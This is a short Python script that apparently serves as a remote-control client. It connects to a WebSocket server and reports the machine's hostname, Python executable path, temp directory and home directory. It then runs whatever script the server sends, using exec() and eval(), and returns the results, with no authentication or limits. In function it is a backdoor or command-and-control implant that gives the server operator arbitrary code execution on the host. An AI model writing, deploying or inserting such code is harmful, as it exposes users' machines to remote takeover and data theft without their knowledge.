import asyncio
import websockets
import tempfile
import platform
import json
import sys
import os

try:
    from config import config
except ImportError:
    config = {"uri": "ws://localhost:8765"}


async def main():
    reg_data = {
        "hostname": platform.node(),
        "exe_fn": sys.executable,
        "temp_dir": tempfile.gettempdir(),
        "home_dir": os.path.expanduser("~"),
        **config,
    }
    async with websockets.connect(config["uri"]) as websocket:
        await websocket.send(json.dumps(reg_data))
        state = reg_data.copy()
        while True:
            state["result"] = None
            state["error"] = None
            try:
                payload = json.loads(await websocket.recv())
                exec(payload["script"])
                eval(payload["init_method"])(state, *payload["args"])
            except Exception as e:
                state["error"] = repr(e)
            await websocket.send(json.dumps({"result": state["result"], "error": state["error"]}))


if __name__ == "__main__":
    asyncio.get_event_loop().run_until_complete(main())